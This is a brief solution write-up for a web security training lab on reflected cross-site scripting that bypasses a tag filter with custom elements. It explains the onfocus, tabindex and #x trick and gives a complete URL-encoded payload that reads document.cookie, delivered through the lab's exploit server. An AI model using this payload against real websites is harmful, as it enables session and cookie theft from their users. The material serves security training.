## Solution steps

- The lab filters standard HTML tags like `<script>`, `<img>`, `<svg>`, etc.
- Only custom tags (like `<xss>`, `<abc>`, etc.) are allowed.
- Since custom tags are allowed, we can use a custom element like <xss> and attach an event handler to it.
- `onfocus=alert(document.cookie)` → to run the script.
- `tabindex=1` → to make the element focusable.
- `#x`: Automatically causes the browser to focus the element with `id="x"` on page load, which triggers `onfocus`.
- Go to the exploit server.
- Enter this Final URL encoded Payload in the Body:
  `<script>
    location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex%3D1%3E#x';
  </script>`
- Write your actual lab id in place of `YOUR-LAB-ID` and click `Deliver exploit to victim`.
